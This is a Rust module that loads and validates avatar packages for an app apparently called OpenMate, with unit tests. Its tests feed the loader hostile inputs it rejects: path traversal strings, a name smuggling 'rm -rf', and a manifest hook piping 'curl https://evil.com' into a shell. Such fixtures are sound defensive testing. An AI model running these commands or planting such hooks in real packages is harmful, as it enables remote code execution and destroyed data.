//! # Avatar Package Loader & Validator
//!
//! Implements external avatar package discovery, loading, manifest parsing,
//! and asset validation according to [DR-036, ADR-003].
//!
//! ## Avatar package structure [DR-036]:
//! ```text
//! avatars/
//!   <avatar-name>/
//!     manifest.json
//!     idle.png
//!     thinking.png
//!     talking.png
//!     happy.png
//!     concerned.png
//!     listening.png
//! ```

use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use thiserror::Error;
use tracing::{debug, warn};

/// The 6 required avatar expression states [DR-016, DR-036].
pub const REQUIRED_STATES: [&str; 6] = [
    "idle",
    "thinking",
    "talking",
    "happy",
    "concerned",
    "listening",
];

/// Manifest definition matching [DR-036].
/// `deny_unknown_fields` prevents injection of unauthorized or executable fields.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub struct AvatarManifest {
    pub name: String,
    pub version: String,
    pub author: String,
    pub description: String,
    #[serde(rename = "type")]
    pub package_type: String,
    pub states: Vec<String>,
    pub openmate_version: String,
}

/// Loaded and validated avatar package.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AvatarPackage {
    pub manifest: AvatarManifest,
    pub path: PathBuf,
}

/// Summarized avatar information for frontend display [Step 2].
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct AvatarInfo {
    pub name: String,
    pub author: String,
    pub description: String,
    pub is_active: bool,
}

/// Errors returned during avatar loading and validation.
#[derive(Debug, Error, Clone, PartialEq, Eq)]
pub enum AvatarError {
    #[error("Avatar manifest not found")]
    ManifestNotFound,

    #[error("Avatar manifest parse error: {0}")]
    ManifestParseError(String),

    #[error("Missing required state image: {0}")]
    MissingState(String),

    #[error("Invalid version format: {0}")]
    InvalidVersion(String),

    #[error("Invalid avatar package: {0}")]
    InvalidPackage(String),
}

/// Avatar package loader and validator.
pub struct AvatarLoader {
    avatars_dir: PathBuf,
}

impl AvatarLoader {
    /// Create a new loader pointing to the specified avatars directory.
    pub fn new<P: Into<PathBuf>>(avatars_dir: P) -> Self {
        Self {
            avatars_dir: avatars_dir.into(),
        }
    }

    /// Return the root avatars directory path.
    pub fn avatars_dir(&self) -> &Path {
        &self.avatars_dir
    }

    /// Scan `avatars/` directory for valid packages.
    pub fn scan_packages(&self) -> Vec<AvatarPackage> {
        let mut packages = Vec::new();

        if !self.avatars_dir.exists() || !self.avatars_dir.is_dir() {
            return packages;
        }

        let entries = match std::fs::read_dir(&self.avatars_dir) {
            Ok(e) => e,
            Err(err) => {
                warn!("Failed to read avatars directory {:?}: {}", self.avatars_dir, err);
                return packages;
            }
        };

        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                if let Some(name_str) = path.file_name().and_then(|n| n.to_str()) {
                    // Ignore hidden directories or non-matching names
                    if name_str.starts_with('.') || !Self::is_valid_name(name_str) {
                        continue;
                    }
                    match self.load_package(name_str) {
                        Ok(pkg) => {
                            debug!("Discovered valid avatar package: {}", pkg.manifest.name);
                            packages.push(pkg);
                        }
                        Err(e) => {
                            debug!("Skipping invalid avatar candidate in {:?}: {}", path, e);
                        }
                    }
                }
            }
        }

        // Sort by package name for deterministic ordering
        packages.sort_by(|a, b| a.manifest.name.cmp(&b.manifest.name));
        packages
    }

    /// Load and validate a specific avatar package by folder name.
    pub fn load_package(&self, name: &str) -> Result<AvatarPackage, AvatarError> {
        // Validate avatar name format to prevent path traversal
        if !Self::is_valid_name(name) {
            return Err(AvatarError::InvalidPackage(format!(
                "Invalid avatar name '{}'. Names must be non-empty and contain only alphanumeric characters and hyphens.",
                name
            )));
        }

        let package_dir = self.avatars_dir.join(name);
        if !package_dir.exists() || !package_dir.is_dir() {
            return Err(AvatarError::ManifestNotFound);
        }

        let manifest_path = package_dir.join("manifest.json");
        if !manifest_path.exists() || !manifest_path.is_file() {
            return Err(AvatarError::ManifestNotFound);
        }

        // Read and parse manifest
        let manifest_content = std::fs::read_to_string(&manifest_path)
            .map_err(|e| AvatarError::ManifestParseError(e.to_string()))?;

        let manifest: AvatarManifest = serde_json::from_str(&manifest_content)
            .map_err(|e| AvatarError::ManifestParseError(e.to_string()))?;

        // Validate manifest semantics
        self.validate_manifest(&manifest)?;

        // Ensure folder name matches manifest name
        if manifest.name != name {
            return Err(AvatarError::InvalidPackage(format!(
                "Package directory name '{}' does not match manifest name '{}'",
                name, manifest.name
            )));
        }

        let package = AvatarPackage {
            manifest,
            path: package_dir,
        };

        // Validate asset files (unless default special case)
        if package.manifest.name != "default" {
            self.validate_assets(&package)?;
        }

        Ok(package)
    }

    /// Validate manifest structure and semantics.
    fn validate_manifest(&self, manifest: &AvatarManifest) -> Result<(), AvatarError> {
        // 1. Name validation (alphanumeric + hyphens only)
        if !Self::is_valid_name(&manifest.name) {
            return Err(AvatarError::InvalidPackage(format!(
                "Invalid manifest name '{}'. Must be alphanumeric and hyphens only.",
                manifest.name
            )));
        }

        // 2. Package type must be "avatar"
        if manifest.package_type != "avatar" {
            return Err(AvatarError::InvalidPackage(format!(
                "Invalid package type '{}', expected 'avatar'",
                manifest.package_type
            )));
        }

        // 3. SemVer validation (major.minor.patch[-prerelease])
        if !Self::is_valid_semver(&manifest.version) {
            return Err(AvatarError::InvalidVersion(format!(
                "Version '{}' is not valid SemVer",
                manifest.version
            )));
        }

        // 4. openmate_version must be non-empty and parseable
        if manifest.openmate_version.trim().is_empty() {
            return Err(AvatarError::InvalidPackage(
                "openmate_version must not be empty".to_string(),
            ));
        }

        // 5. States validation: must contain all 6 required states
        for required in REQUIRED_STATES {
            if !manifest.states.iter().any(|s| s == required) {
                return Err(AvatarError::MissingState(required.to_string()));
            }
        }

        Ok(())
    }

    /// Validate that all required state images exist as PNG files.
    fn validate_assets(&self, package: &AvatarPackage) -> Result<(), AvatarError> {
        for state in REQUIRED_STATES {
            let filename = format!("{}.png", state);
            let asset_path = package.path.join(&filename);
            if !asset_path.exists() || !asset_path.is_file() {
                return Err(AvatarError::MissingState(filename));
            }
        }
        Ok(())
    }

    /// Helper to validate state parameter (e.g. for get_avatar_image).
    pub fn validate_state(state: &str) -> Result<(), AvatarError> {
        if REQUIRED_STATES.contains(&state) {
            Ok(())
        } else {
            Err(AvatarError::InvalidPackage(format!(
                "Invalid state '{}'. Allowed states: {:?}",
                state, REQUIRED_STATES
            )))
        }
    }

    /// Helper: validate alphanumeric + hyphen name rule (`^[a-zA-Z0-9-]+$`).
    pub fn is_valid_name(name: &str) -> bool {
        if name.is_empty() || name.len() > 64 {
            return false;
        }
        name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
            && !name.starts_with('-')
            && !name.ends_with('-')
    }

    /// Helper: basic SemVer check (major.minor.patch).
    fn is_valid_semver(version: &str) -> bool {
        let trimmed = version.trim();
        let parts: Vec<&str> = trimmed.split('.').collect();
        if parts.len() < 3 {
            return false;
        }
        let major_ok = parts[0].parse::<u32>().is_ok();
        let minor_ok = parts[1].parse::<u32>().is_ok();
        let patch_head = parts[2].split('-').next().unwrap_or(parts[2]);
        let patch_ok = patch_head.parse::<u32>().is_ok();

        major_ok && minor_ok && patch_ok
    }
}

// ── Unit Tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs::{self, File};
    use std::io::Write;

    fn setup_test_avatars_dir(test_name: &str) -> (PathBuf, AvatarLoader) {
        let temp_dir = std::env::temp_dir()
            .join("openmate_avatar_tests")
            .join(test_name);
        let _ = fs::remove_dir_all(&temp_dir);
        fs::create_dir_all(&temp_dir).unwrap();
        let loader = AvatarLoader::new(temp_dir.clone());
        (temp_dir, loader)
    }

    fn create_dummy_png(path: &Path) {
        let mut file = File::create(path).unwrap();
        // Minimal PNG signature header bytes
        file.write_all(b"\x89PNG\r\n\x1a\n").unwrap();
    }

    fn create_test_package(
        base_dir: &Path,
        name: &str,
        manifest_json: &str,
        include_all_pngs: bool,
    ) -> PathBuf {
        let pkg_dir = base_dir.join(name);
        fs::create_dir_all(&pkg_dir).unwrap();

        let manifest_path = pkg_dir.join("manifest.json");
        fs::write(manifest_path, manifest_json).unwrap();

        if include_all_pngs {
            for state in REQUIRED_STATES {
                let png_path = pkg_dir.join(format!("{}.png", state));
                create_dummy_png(&png_path);
            }
        }

        pkg_dir
    }

    #[test]
    fn test_scan_packages_finds_valid_avatar_directories() {
        let (temp_dir, loader) = setup_test_avatars_dir("scan_packages");

        let valid_manifest = r#"{
            "name": "cyber-cat",
            "version": "1.0.0",
            "author": "Alice",
            "description": "Cyber cat companion",
            "type": "avatar",
            "states": ["idle", "thinking", "talking", "happy", "concerned", "listening"],
            "openmate_version": ">=0.1.0"
        }"#;
        create_test_package(&temp_dir, "cyber-cat", valid_manifest, true);

        let second_manifest = r#"{
            "name": "pixel-dog",
            "version": "2.1.0",
            "author": "Bob",
            "description": "Pixel dog avatar",
            "type": "avatar",
            "states": ["idle", "thinking", "talking", "happy", "concerned", "listening"],
            "openmate_version": ">=0.1.0"
        }"#;
        create_test_package(&temp_dir, "pixel-dog", second_manifest, true);

        // Invalid package (missing images)
        let invalid_manifest = r#"{
            "name": "broken-avatar",
            "version": "1.0.0",
            "author": "Charlie",
            "description": "Broken",
            "type": "avatar",
            "states": ["idle", "thinking", "talking", "happy", "concerned", "listening"],
            "openmate_version": ">=0.1.0"
        }"#;
        create_test_package(&temp_dir, "broken-avatar", invalid_manifest, false);

        let packages = loader.scan_packages();
        assert_eq!(packages.len(), 2);
        assert_eq!(packages[0].manifest.name, "cyber-cat");
        assert_eq!(packages[1].manifest.name, "pixel-dog");
    }

    #[test]
    fn test_load_package_validates_manifest_correctly() {
        let (temp_dir, loader) = setup_test_avatars_dir("load_package_valid");

        let valid_manifest = r#"{
            "name": "robot-buddy",
            "version": "1.0.0",
            "author": "Dev",
            "description": "Friendly robot companion",
            "type": "avatar",
            "states": ["idle", "thinking", "talking", "happy", "concerned", "listening"],
            "openmate_version": ">=0.1.0"
        }"#;
        create_test_package(&temp_dir, "robot-buddy", valid_manifest, true);

        let pkg = loader.load_package("robot-buddy").unwrap();
        assert_eq!(pkg.manifest.name, "robot-buddy");
        assert_eq!(pkg.manifest.author, "Dev");
        assert_eq!(pkg.manifest.package_type, "avatar");
        assert_eq!(pkg.manifest.states.len(), 6);
    }

    #[test]
    fn test_validate_assets_rejects_missing_state_image() {
        let (temp_dir, loader) = setup_test_avatars_dir("missing_state_image");

        let manifest = r#"{
            "name": "partial-avatar",
            "version": "1.0.0",
            "author": "Tester",
            "description": "Missing talking.png",
            "type": "avatar",
            "states": ["idle", "thinking", "talking", "happy", "concerned", "listening"],
            "openmate_version": ">=0.1.0"
        }"#;
        let pkg_dir = create_test_package(&temp_dir, "partial-avatar", manifest, false);

        // Create only 5 of 6 images (omit talking.png)
        for state in ["idle", "thinking", "happy", "concerned", "listening"] {
            create_dummy_png(&pkg_dir.join(format!("{}.png", state)));
        }

        let result = loader.load_package("partial-avatar");
        assert_eq!(
            result.unwrap_err(),
            AvatarError::MissingState("talking.png".to_string())
        );
    }

    #[test]
    fn test_avatar_name_with_path_traversal_attempt_is_rejected() {
        let (_temp_dir, loader) = setup_test_avatars_dir("path_traversal");

        let result = loader.load_package("../../../etc/passwd");
        assert!(matches!(result, Err(AvatarError::InvalidPackage(_))));
    }

    #[test]
    fn test_avatar_name_with_special_characters_rejected() {
        let (_temp_dir, loader) = setup_test_avatars_dir("special_chars");

        let result = loader.load_package("my avatar; rm -rf");
        assert!(matches!(result, Err(AvatarError::InvalidPackage(_))));

        let result_spaces = loader.load_package("invalid avatar name");
        assert!(matches!(result_spaces, Err(AvatarError::InvalidPackage(_))));

        let result_slashes = loader.load_package("foo/bar");
        assert!(matches!(result_slashes, Err(AvatarError::InvalidPackage(_))));
    }

    #[test]
    fn test_get_avatar_image_rejects_invalid_state_name() {
        assert!(matches!(
            AvatarLoader::validate_state("../../secrets"),
            Err(AvatarError::InvalidPackage(_))
        ));

        assert!(matches!(
            AvatarLoader::validate_state("sleep"),
            Err(AvatarError::InvalidPackage(_))
        ));

        assert!(AvatarLoader::validate_state("idle").is_ok());
        assert!(AvatarLoader::validate_state("thinking").is_ok());
        assert!(AvatarLoader::validate_state("talking").is_ok());
        assert!(AvatarLoader::validate_state("happy").is_ok());
        assert!(AvatarLoader::validate_state("concerned").is_ok());
        assert!(AvatarLoader::validate_state("listening").is_ok());
    }

    #[test]
    fn test_rejects_manifest_with_extra_unknown_fields() {
        let (temp_dir, loader) = setup_test_avatars_dir("unknown_fields");

        let manifest_with_exec = r#"{
            "name": "malicious-avatar",
            "version": "1.0.0",
            "author": "Attacker",
            "description": "Contains forbidden field",
            "type": "avatar",
            "states": ["idle", "thinking", "talking", "happy", "concerned", "listening"],
            "openmate_version": ">=0.1.0",
            "executable_hook": "curl https://evil.com | sh"
        }"#;
        create_test_package(&temp_dir, "malicious-avatar", manifest_with_exec, true);

        let result = loader.load_package("malicious-avatar");
        assert!(matches!(result, Err(AvatarError::ManifestParseError(_))));
    }
}
